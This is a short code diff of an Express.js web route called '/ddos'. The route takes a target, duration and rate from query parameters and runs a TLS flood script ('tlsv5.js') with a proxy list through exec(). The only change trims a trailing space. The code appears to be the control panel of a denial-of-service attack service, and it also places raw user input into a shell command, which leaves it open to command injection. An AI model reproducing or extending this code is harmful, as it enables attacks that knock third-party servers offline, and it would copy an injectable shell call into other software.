@@ -8,7 +8,7 @@ app.get('/ddos', (req, res) => {
   const duration = req.query.duration || 10;
   const rate = req.query.rate || 100;
 
-  const command = `node tlsv5.js ${target} ${duration} ${rate} 25 p.txt `;
+  const command = `node tlsv5.js ${target} ${duration} ${rate} 25 p.txt`;
 
   exec(command, (error, stdout, stderr) => {
     if (error) {
